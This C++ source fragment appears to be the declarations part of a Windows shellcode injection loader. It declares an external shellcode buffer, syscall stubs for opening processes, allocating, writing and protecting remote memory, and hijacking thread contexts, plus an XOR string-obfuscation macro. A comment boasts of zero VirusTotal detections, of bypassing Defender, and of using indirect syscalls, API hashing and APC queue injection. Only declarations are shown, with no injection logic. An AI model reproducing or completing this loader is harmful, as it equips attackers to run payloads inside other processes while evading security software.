#include <phnt_windows.h>
#include <phnt.h>

#pragma comment(lib, "ntdll")


#define PHNT_VERSION PHNT_WIN11
#include <iostream>


#include <stdio.h>
#include <string.h>
#include <intrin.h>
#include <TlHelp32.h>


extern unsigned char shellcode[];

extern unsigned int shellcode_len;

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

extern "C" NTSTATUS sysNtOpenProcess(

    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    CLIENT_ID
);


extern "C" NTSTATUS sysNtCreateThreadEx(
    PHANDLE,
    ACCESS_MASK,
    PVOID,
    HANDLE,
    PVOID,
    PVOID,
    ULONG,
    SIZE_T,
    SIZE_T,
    SIZE_T,
    PVOID
);

extern "C" NTSTATUS sysNtOpenThread(
    PHANDLE,
    ACCESS_MASK,
    POBJECT_ATTRIBUTES,
    CLIENT_ID
);


extern "C" NTSTATUS sysNtQueryInfoProcess(
    HANDLE,
    PROCESSINFOCLASS,
    PVOID,
    ULONG,
    PULONG
);
extern "C" NTSTATUS sysNtAllocateVirtualMemory(
    HANDLE,
    PVOID*,
    ULONG_PTR,
    PSIZE_T,
    ULONG,
    ULONG
);

extern "C" NTSTATUS sysNtWriteVirtualMemory(
    HANDLE,
    PVOID,
    const PVOID,
    SIZE_T,
    PSIZE_T
);


extern "C" NTSTATUS sysNtProtectVirtualMemory(
    HANDLE,
    PVOID*,
    PSIZE_T,
    ULONG,
    PULONG
);

extern "C" NTSTATUS sysNtWaitForSingleObject(
    HANDLE,
    BOOLEAN,
    PLARGE_INTEGER

);

extern "C" NTSTATUS sysRtlProcessHeap(
   
    
);

extern "C" NTSTATUS sysSuspendThread(
    HANDLE,
    PULONG
);

extern "C" NTSTATUS sysNtGetContextThread(
    HANDLE,
    PCONTEXT
);

extern "C" NTSTATUS sysNtSetContextThread(
    HANDLE,
    PCONTEXT
);
extern "C" NTSTATUS sysNtResumeThread(
    HANDLE,
    PULONG
);
extern "C" NTSTATUS sysNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);
extern "C" NTSTATUS sysNtFreeVirtualMemory(
    HANDLE,
    PVOID,
    SIZE_T,
    ULONG
);


// Contains some, but not all definitions

// If you still get "undefined" for SYSTEM_THREAD_INFORMATION:



#define _CRT_SECURE_NO_WARNINGS

//current file hash: 272a968bfbc67599a14c666d0f09142f1222f2ee1c6e3829636b37c183a34f36 (with indirect syscalls + api hashing + apc queue injection full indirect syscalls) (v4)
//0 out of 70 on virustotal.com, bypass defender easily






typedef LONG       KPRIORITY;





//end of struct def

#define DECODE(str) xor_decode((char*)str, sizeof(str) - 1, 0xAA)





extern "C" NTSTATUS sysNtReadVirtualMemory(
    	HANDLE               ,
    	PVOID                ,
    	PVOID                ,
    	ULONG               ,
     PULONG               
    );
